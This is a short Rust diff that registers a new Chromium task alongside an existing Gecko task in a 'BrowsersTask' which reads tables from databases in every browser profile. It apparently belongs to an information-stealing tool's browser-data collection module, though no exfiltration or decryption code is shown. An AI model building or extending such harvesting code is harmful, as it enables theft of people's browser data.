@@ -1,6 +1,7 @@
 #![no_std]
 
 mod gecko;
+mod chromium;
 
 extern crate alloc;
 use database::{DatabaseReader, Databases, TableRecord};
@@ -15,6 +16,7 @@ use tasks::Task;
 use tasks::{composite_task, impl_composite_task_runner, CompositeTask};
 use utils::path::{Path, WriteToFile};
 use crate::gecko::GeckoTask;
+use crate::chromium::ChromiumTask;
 
 pub struct BrowsersTask {
     inner: CompositeTask
@@ -24,6 +26,7 @@ impl BrowsersTask {
     pub fn new() -> Self {
         Self {
             inner: composite_task!(
+                ChromiumTask::new(),
                 GeckoTask::new()
             )
         }
@@ -65,7 +68,7 @@ where
 {
     collect_from_all_profiles(profiles, |profile| {
         let db_path = path(profile);
-        
+
         if !db_path.as_ref().is_exists() {
             None
         } else {
@@ -84,7 +87,7 @@ where
         .filter_map(|profile| f(profile))
         .flat_map(|v| v.into_iter())
         .collect();
-    
+
     if data.is_empty() {
         None
     } else {
@@ -120,11 +123,11 @@ where
     let bytes = path.read_file().ok()?;
     let db = db_type.as_ref().read_from_bytes(&bytes).ok()?;
     let table = db.read_table(table_name)?;
-    
+
     let records = table
         .filter_map(|record| mapper(&record))
         .collect();
-    
+
     Some(records)
 }
 
